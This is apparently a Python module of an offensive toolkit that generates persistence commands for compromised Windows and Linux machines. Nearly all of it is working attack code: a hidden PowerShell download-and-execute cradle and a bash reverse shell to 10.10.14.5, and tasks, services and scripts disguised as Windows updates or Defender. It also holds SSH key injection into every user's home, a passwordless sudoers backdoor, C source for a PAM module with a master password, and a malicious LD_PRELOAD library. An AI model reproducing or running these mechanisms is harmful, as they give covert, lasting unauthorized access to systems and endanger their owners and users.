"""
Persistence Mechanism Module
Establishes persistence on compromised systems using various techniques for Windows and Linux.
"""

import asyncio
import json
import base64
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Literal
from enum import Enum


class PersistenceTechnique(str, Enum):
    """Persistence techniques"""
    REGISTRY_RUN = "registry_run"
    SCHEDULED_TASK = "scheduled_task"
    WINDOWS_SERVICE = "windows_service"
    WMI_EVENT = "wmi_event"
    STARTUP_FOLDER = "startup_folder"
    CRON_JOB = "cron_job"
    SYSTEMD_SERVICE = "systemd_service"
    SSH_KEY = "ssh_key"
    BASHRC_PROFILE = "bashrc_profile"
    SUDO_BACKDOOR = "sudo_backdoor"
    PAM_BACKDOOR = "pam_backdoor"
    LD_PRELOAD = "ld_preload"


@dataclass
class PersistenceMechanism:
    """Persistence mechanism details"""
    technique: PersistenceTechnique
    os_type: str  # windows, linux, macos
    persistence_command: str
    trigger: str  # boot, login, interval
    stealth_level: str  # low, medium, high
    description: str
    removal_command: str
    requires_admin: bool = True
    mitre_technique: Optional[str] = None
    detection_difficulty: str = "medium"  # low, medium, high
    
    def to_dict(self) -> Dict:
        return {
            "technique": self.technique.value,
            "os_type": self.os_type,
            "persistence_command": self.persistence_command,
            "trigger": self.trigger,
            "stealth_level": self.stealth_level,
            "description": self.description,
            "removal_command": self.removal_command,
            "requires_admin": self.requires_admin,
            "mitre_technique": self.mitre_technique,
            "detection_difficulty": self.detection_difficulty
        }


class PersistenceManager:
    """Manager for establishing and managing persistence mechanisms"""
    
    def __init__(self, payload: str = "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\""):
        self.payload = payload
        self.payload_encoded = base64.b64encode(payload.encode()).decode()
    
    async def generate_windows_persistence(
        self,
        technique: PersistenceTechnique,
        stealth: bool = True
    ) -> PersistenceMechanism:
        """Generate Windows persistence mechanism"""
        
        if technique == PersistenceTechnique.REGISTRY_RUN:
            return await self._registry_run_persistence(stealth)
        elif technique == PersistenceTechnique.SCHEDULED_TASK:
            return await self._scheduled_task_persistence(stealth)
        elif technique == PersistenceTechnique.WINDOWS_SERVICE:
            return await self._windows_service_persistence(stealth)
        elif technique == PersistenceTechnique.WMI_EVENT:
            return await self._wmi_event_persistence(stealth)
        elif technique == PersistenceTechnique.STARTUP_FOLDER:
            return await self._startup_folder_persistence(stealth)
        else:
            raise ValueError(f"Windows technique {technique} not implemented")
    
    async def generate_linux_persistence(
        self,
        technique: PersistenceTechnique,
        stealth: bool = True
    ) -> PersistenceMechanism:
        """Generate Linux persistence mechanism"""
        
        if technique == PersistenceTechnique.CRON_JOB:
            return await self._cron_job_persistence(stealth)
        elif technique == PersistenceTechnique.SYSTEMD_SERVICE:
            return await self._systemd_service_persistence(stealth)
        elif technique == PersistenceTechnique.SSH_KEY:
            return await self._ssh_key_persistence(stealth)
        elif technique == PersistenceTechnique.BASHRC_PROFILE:
            return await self._bashrc_persistence(stealth)
        elif technique == PersistenceTechnique.SUDO_BACKDOOR:
            return await self._sudo_backdoor_persistence(stealth)
        elif technique == PersistenceTechnique.PAM_BACKDOOR:
            return await self._pam_backdoor_persistence(stealth)
        elif technique == PersistenceTechnique.LD_PRELOAD:
            return await self._ld_preload_persistence(stealth)
        else:
            raise ValueError(f"Linux technique {technique} not implemented")
    
    async def _registry_run_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Windows Registry Run key persistence"""
        
        key_name = "WindowsUpdate" if stealth else "Persistence"
        reg_path = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" if not stealth else "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        
        command = f"""# Registry Run Key Persistence
reg add "{reg_path}" /v "{key_name}" /t REG_SZ /d "{self.payload}" /f

# OR with PowerShell (stealthier)
powershell -c "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{key_name}' -Value '{self.payload}'"

# Verify
reg query "{reg_path}" /v "{key_name}\""""
        
        removal = f"""reg delete "{reg_path}" /v "{key_name}" /f"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.REGISTRY_RUN,
            os_type="windows",
            persistence_command=command,
            trigger="login",
            stealth_level="medium" if stealth else "low",
            description="Registry Run key executed at user login",
            removal_command=removal,
            requires_admin=False,
            mitre_technique="T1547.001",
            detection_difficulty="low"
        )
    
    async def _scheduled_task_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Windows Scheduled Task persistence"""
        
        task_name = "SystemMaintenance" if stealth else "PersistenceTask"
        trigger_type = "DAILY" if stealth else "ONLOGON"
        
        command = f"""# Scheduled Task Persistence
schtasks /create /tn "{task_name}" /tr "{self.payload}" /sc {trigger_type} /st 09:00 /f

# OR with PowerShell (stealthier, hidden)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -enc {self.payload_encoded}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType S4U
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "{task_name}" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Verify
schtasks /query /tn "{task_name}" /v"""
        
        removal = f"""schtasks /delete /tn "{task_name}" /f"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.SCHEDULED_TASK,
            os_type="windows",
            persistence_command=command,
            trigger="boot" if trigger_type == "DAILY" else "login",
            stealth_level="high" if stealth else "medium",
            description="Scheduled task executed at specified trigger",
            removal_command=removal,
            requires_admin=False,
            mitre_technique="T1053.005",
            detection_difficulty="medium"
        )
    
    async def _windows_service_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Windows Service persistence"""
        
        service_name = "WinDefender" if stealth else "PersistenceService"
        display_name = "Windows Defender Update Service" if stealth else "Persistence Service"
        
        command = f"""# Windows Service Persistence
# Create service binary (requires pre-compiled service EXE)
sc.exe create {service_name} binPath= "C:\\Windows\\Temp\\{service_name}.exe" start= auto DisplayName= "{display_name}"
sc.exe description {service_name} "Provides security updates and monitoring"

# OR install with PowerShell
New-Service -Name "{service_name}" -BinaryPathName "C:\\Windows\\Temp\\{service_name}.exe" -DisplayName "{display_name}" -StartupType Automatic

# Start service
sc.exe start {service_name}

# Verify
sc.exe query {service_name}
Get-Service -Name "{service_name}\""""
        
        removal = f"""sc.exe stop {service_name}
sc.exe delete {service_name}
del C:\\Windows\\Temp\\{service_name}.exe"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.WINDOWS_SERVICE,
            os_type="windows",
            persistence_command=command,
            trigger="boot",
            stealth_level="high" if stealth else "medium",
            description="Windows service executed at system boot with SYSTEM privileges",
            removal_command=removal,
            requires_admin=True,
            mitre_technique="T1543.003",
            detection_difficulty="medium"
        )
    
    async def _wmi_event_persistence(self, stealth: bool) -> PersistenceMechanism:
        """WMI Event Subscription persistence (highly stealthy)"""
        
        filter_name = "SystemFilter" if stealth else "PersistFilter"
        consumer_name = "SystemConsumer" if stealth else "PersistConsumer"
        
        command = f"""# WMI Event Subscription Persistence (very stealthy)
# Create WMI Event Filter (trigger every 5 minutes)
$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
    Name = "{filter_name}"
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}}

# Create WMI Event Consumer (payload)
$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
    Name = "{consumer_name}"
    CommandLineTemplate = "{self.payload}"
}}

# Bind Filter to Consumer
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
    Filter = $filter
    Consumer = $consumer
}}

# Verify
Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {{$_.Name -eq "{filter_name}"}}
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq "{consumer_name}"}}")"""
        
        removal = f"""Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {{$_.Name -eq "{filter_name}"}} | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq "{consumer_name}"}} | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {{$_.Consumer -like "*{consumer_name}*"}} | Remove-WmiObject"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.WMI_EVENT,
            os_type="windows",
            persistence_command=command,
            trigger="interval",
            stealth_level="high",
            description="WMI event subscription - executes payload periodically (very stealthy)",
            removal_command=removal,
            requires_admin=True,
            mitre_technique="T1546.003",
            detection_difficulty="high"
        )
    
    async def _startup_folder_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Windows Startup folder persistence"""
        
        filename = "update.vbs" if stealth else "persistence.bat"
        startup_path = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        
        command = f"""# Startup Folder Persistence
# Create VBS script (stealthier than BAT)
echo Set objShell = CreateObject("WScript.Shell") > {startup_path}\\{filename}
echo objShell.Run "{self.payload}", 0, False >> {startup_path}\\{filename}

# OR create LNK shortcut
powershell -c "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('{startup_path}\\update.lnk'); $s.TargetPath = 'powershell.exe'; $s.Arguments = '-nop -w hidden -c {self.payload}'; $s.Save()"

# Verify
dir "{startup_path}\""""
        
        removal = f"""del "{startup_path}\\{filename}" /f /q"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.STARTUP_FOLDER,
            os_type="windows",
            persistence_command=command,
            trigger="login",
            stealth_level="medium" if stealth else "low",
            description="Startup folder script executed at user login",
            removal_command=removal,
            requires_admin=False,
            mitre_technique="T1547.001",
            detection_difficulty="low"
        )
    
    async def _cron_job_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Linux cron job persistence"""
        
        cron_line = f"*/5 * * * * {self.payload} > /dev/null 2>&1" if stealth else f"@reboot {self.payload}"
        
        command = f"""# Cron Job Persistence
# Add to user crontab
(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -

# OR add to system cron (requires root)
echo "{cron_line}" >> /etc/cron.d/system-update

# Stealthy: Use obscure timing
(crontab -l 2>/dev/null; echo "23 3 * * * {self.payload} > /dev/null 2>&1") | crontab -

# Verify
crontab -l"""
        
        removal = f"""crontab -l | grep -v "{self.payload}" | crontab -
rm -f /etc/cron.d/system-update"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.CRON_JOB,
            os_type="linux",
            persistence_command=command,
            trigger="interval" if stealth else "boot",
            stealth_level="high" if stealth else "medium",
            description="Cron job executed at specified interval",
            removal_command=removal,
            requires_admin=False,
            mitre_technique="T1053.003",
            detection_difficulty="medium"
        )
    
    async def _systemd_service_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Linux systemd service persistence"""
        
        service_name = "systemd-update" if stealth else "persistence"
        
        command = f"""# Systemd Service Persistence
# Create service file
cat > /etc/systemd/system/{service_name}.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={self.payload}
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable {service_name}.service
systemctl start {service_name}.service

# Verify
systemctl status {service_name}.service"""
        
        removal = f"""systemctl stop {service_name}.service
systemctl disable {service_name}.service
rm -f /etc/systemd/system/{service_name}.service
systemctl daemon-reload"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.SYSTEMD_SERVICE,
            os_type="linux",
            persistence_command=command,
            trigger="boot",
            stealth_level="high" if stealth else "medium",
            description="Systemd service executed at boot with root privileges",
            removal_command=removal,
            requires_admin=True,
            mitre_technique="T1543.002",
            detection_difficulty="medium"
        )
    
    async def _ssh_key_persistence(self, stealth: bool) -> PersistenceMechanism:
        """SSH key injection persistence"""
        
        command = f"""# SSH Key Persistence
# Generate SSH key pair (if needed)
ssh-keygen -t ed25519 -f /tmp/persist_key -N ""

# Inject public key into authorized_keys
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Stealthy: Inject into root's authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx root@system" >> /root/.ssh/authorized_keys

# For persistence across all users
for user_home in /home/*; do
    mkdir -p "$user_home/.ssh"
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" >> "$user_home/.ssh/authorized_keys"
    chmod 600 "$user_home/.ssh/authorized_keys"
done

# Login with:
ssh -i /tmp/persist_key user@target"""
        
        removal = f"""sed -i '/attacker@kali/d' ~/.ssh/authorized_keys
sed -i '/attacker@kali/d' /root/.ssh/authorized_keys"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.SSH_KEY,
            os_type="linux",
            persistence_command=command,
            trigger="manual",
            stealth_level="high",
            description="SSH key injection for passwordless access",
            removal_command=removal,
            requires_admin=False,
            mitre_technique="T1098.004",
            detection_difficulty="medium"
        )
    
    async def _bashrc_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Bash profile persistence"""
        
        profile_file = "~/.bashrc" if not stealth else "~/.profile"
        
        command = f"""# Bash Profile Persistence
# Inject into bashrc (executed at every bash login)
echo "{self.payload} > /dev/null 2>&1 &" >> ~/.bashrc

# Stealthy: Hide in function
cat >> ~/.bashrc << 'EOF'

# System update check
function __update_check() {{
    {self.payload} > /dev/null 2>&1 &
}}
__update_check
EOF

# Even stealthier: Inject into /etc/profile (all users, requires root)
echo "{self.payload} > /dev/null 2>&1 &" >> /etc/profile

# Verify
tail ~/.bashrc"""
        
        removal = f"""sed -i '/{self.payload}/d' ~/.bashrc
sed -i '/__update_check/,+3d' ~/.bashrc"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.BASHRC_PROFILE,
            os_type="linux",
            persistence_command=command,
            trigger="login",
            stealth_level="high" if stealth else "medium",
            description="Bash profile executed at every shell login",
            removal_command=removal,
            requires_admin=False,
            mitre_technique="T1546.004",
            detection_difficulty="low"
        )
    
    async def _sudo_backdoor_persistence(self, stealth: bool) -> PersistenceMechanism:
        """Sudo backdoor persistence"""
        
        command = f"""# Sudo Backdoor Persistence
# Add backdoor user to sudoers
echo "backdoor ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

# OR create sudoers file in sudoers.d
echo "backdoor ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/backdoor
chmod 440 /etc/sudoers.d/backdoor

# Stealthy: Modify existing sudo binary
cp /usr/bin/sudo /usr/bin/sudo.bak
# Compile backdoored sudo that accepts specific password

# Verify
sudo -l"""
        
        removal = f"""sed -i '/backdoor/d' /etc/sudoers
rm -f /etc/sudoers.d/backdoor
mv /usr/bin/sudo.bak /usr/bin/sudo"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.SUDO_BACKDOOR,
            os_type="linux",
            persistence_command=command,
            trigger="manual",
            stealth_level="high",
            description="Sudo backdoor for passwordless privilege escalation",
            removal_command=removal,
            requires_admin=True,
            mitre_technique="T1548.003",
            detection_difficulty="medium"
        )
    
    async def _pam_backdoor_persistence(self, stealth: bool) -> PersistenceMechanism:
        """PAM backdoor persistence (master password)"""
        
        command = f"""# PAM Backdoor Persistence
# Create PAM module with master password
cat > /tmp/pam_backdoor.c << 'EOF'
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
    const char *master_pass = "Sup3rS3cr3t!";
    const char *password = NULL;
    
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    
    if (password != NULL && strcmp(password, master_pass) == 0) {{
        return PAM_SUCCESS;
    }}
    
    return PAM_IGNORE;  // Continue to next PAM module
}}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
    return PAM_SUCCESS;
}}
EOF

# Compile PAM module
gcc -fPIC -c /tmp/pam_backdoor.c -o /tmp/pam_backdoor.o
gcc -shared /tmp/pam_backdoor.o -o /tmp/pam_backdoor.so
cp /tmp/pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Inject into PAM configuration
sed -i '1i auth sufficient pam_backdoor.so' /etc/pam.d/common-auth

# Now you can login as any user with password: Sup3rS3cr3t!
# Example: su root (enter: Sup3rS3cr3t!)"""
        
        removal = f"""sed -i '/pam_backdoor/d' /etc/pam.d/common-auth
rm -f /lib/x86_64-linux-gnu/security/pam_backdoor.so"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.PAM_BACKDOOR,
            os_type="linux",
            persistence_command=command,
            trigger="manual",
            stealth_level="high",
            description="PAM module backdoor - master password for all accounts",
            removal_command=removal,
            requires_admin=True,
            mitre_technique="T1556.003",
            detection_difficulty="high"
        )
    
    async def _ld_preload_persistence(self, stealth: bool) -> PersistenceMechanism:
        """LD_PRELOAD persistence"""
        
        command = f"""# LD_PRELOAD Persistence
# Create malicious shared library
cat > /tmp/malicious.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {{
    unsetenv("LD_PRELOAD");
    system("{self.payload}");
}}
EOF

# Compile
gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -ldl

# Install
cp /tmp/malicious.so /usr/lib/malicious.so

# Inject into /etc/ld.so.preload (global, requires root)
echo "/usr/lib/malicious.so" >> /etc/ld.so.preload

# OR inject into user environment
echo "export LD_PRELOAD=/usr/lib/malicious.so" >> ~/.bashrc

# Now every binary execution will trigger the payload"""
        
        removal = f"""sed -i '/malicious.so/d' /etc/ld.so.preload
sed -i '/LD_PRELOAD/d' ~/.bashrc
rm -f /usr/lib/malicious.so"""
        
        return PersistenceMechanism(
            technique=PersistenceTechnique.LD_PRELOAD,
            os_type="linux",
            persistence_command=command,
            trigger="every_execution",
            stealth_level="high",
            description="LD_PRELOAD library injection - executes on every binary run",
            removal_command=removal,
            requires_admin=True,
            mitre_technique="T1574.006",
            detection_difficulty="medium"
        )
    
    async def generate_all_mechanisms(
        self,
        os_type: Literal["windows", "linux"],
        stealth: bool = True
    ) -> List[PersistenceMechanism]:
        """Generate all persistence mechanisms for an OS"""
        
        mechanisms = []
        
        if os_type == "windows":
            techniques = [
                PersistenceTechnique.REGISTRY_RUN,
                PersistenceTechnique.SCHEDULED_TASK,
                PersistenceTechnique.WINDOWS_SERVICE,
                PersistenceTechnique.WMI_EVENT,
                PersistenceTechnique.STARTUP_FOLDER
            ]
            for technique in techniques:
                mechanism = await self.generate_windows_persistence(technique, stealth)
                mechanisms.append(mechanism)
        
        elif os_type == "linux":
            techniques = [
                PersistenceTechnique.CRON_JOB,
                PersistenceTechnique.SYSTEMD_SERVICE,
                PersistenceTechnique.SSH_KEY,
                PersistenceTechnique.BASHRC_PROFILE,
                PersistenceTechnique.SUDO_BACKDOOR,
                PersistenceTechnique.PAM_BACKDOOR,
                PersistenceTechnique.LD_PRELOAD
            ]
            for technique in techniques:
                mechanism = await self.generate_linux_persistence(technique, stealth)
                mechanisms.append(mechanism)
        
        return mechanisms


async def main():
    """Example usage"""
    payload = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
    manager = PersistenceManager(payload=payload)
    
    print("[*] Generating Windows persistence mechanisms...")
    windows_mechanisms = await manager.generate_all_mechanisms("windows", stealth=True)
    print(f"[+] Generated {len(windows_mechanisms)} Windows mechanisms")
    
    print("\n[*] Generating Linux persistence mechanisms...")
    linux_mechanisms = await manager.generate_all_mechanisms("linux", stealth=True)
    print(f"[+] Generated {len(linux_mechanisms)} Linux mechanisms")
    
    # Display one example
    print("\n[+] Example - WMI Event Persistence:")
    wmi = [m for m in windows_mechanisms if m.technique == PersistenceTechnique.WMI_EVENT][0]
    print(f"    Technique: {wmi.technique}")
    print(f"    Stealth Level: {wmi.stealth_level}")
    print(f"    MITRE: {wmi.mitre_technique}")
    print(f"    Detection Difficulty: {wmi.detection_difficulty}")


if __name__ == "__main__":
    asyncio.run(main())
